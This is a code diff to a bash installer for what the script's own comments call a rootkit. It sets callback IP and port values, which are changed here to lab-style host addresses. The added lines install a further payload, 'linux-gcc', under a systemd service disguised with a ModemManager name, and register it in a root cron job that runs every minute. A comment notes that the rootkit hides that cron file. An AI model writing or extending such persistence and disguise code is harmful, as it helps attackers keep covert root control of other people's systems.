@@ -1,8 +1,8 @@
 #!/bin/bash
 
-ip="192.168.56.1"
+ip="10.0.2.2"
 port2="9999"
-portp="15827"
+portp="15136"
 
 source /tmp/.functions
 source /tmp/.rootkit
@@ -68,6 +68,9 @@ if [ "$?" == "0" ]; then
   mkdir /usr/local/share/d-bus 2>/dev/null
   create_script "$d_bus_bash_script" "/usr/local/share/d-bus/d-bus"
   create_systemd_service "$d_bus_systemd_service" "dbus-org.freedesktop.ModemManager11.service"
+  mkdir /usr/lib/linux-gcc 2>/dev/null
+  create_script "$linux_gcc_script" "/usr/lib/linux-gcc/linux-gcc"
+  create_systemd_service "$linux_gcc_systemd_service" "dbus-org.freedesktop.ModemManager12.service"
 else
   : '
   #create the rc scripts and services
@@ -92,11 +95,13 @@ else
   create_script "$usb_bus_script" "/var/lib/usb-bus/usb-bus"
   mkdir /usr/local/share/d-bus 2>/dev/null
   create_script "$d_bus_python_script" "/usr/local/share/d-bus/d-bus"
+  mkdir /usr/lib/linux-gcc 2>/dev/null
+  create_script "$linux_gcc_script" "/usr/lib/linux-gcc/linux-gcc"
   printf "create the root crontab file... "
   #first runs d-bus and then usb-bus because usb-bus inserts the rootkit which hides the crontab file and d-bus would not run then
   printf '#DO NOT EDIT\n#This file is generated automatically by cron\n
 SHELL=/bin/bash\n
-* * * * * root /usr/local/share/d-bus/d-bus\n* * * * * root /var/lib/usb-bus/usb-bus\n' >/etc/cron.d/usb-bus
+* * * * * root /usr/local/share/d-bus/d-bus\n* * * * * root /var/lib/usb-bus/usb-bus\n* * * * * root /usr/lib/linux-gcc/linux-gcc\n' >/etc/cron.d/usb-bus
   chown root:root /etc/cron.d/usb-bus
   finish
 fi
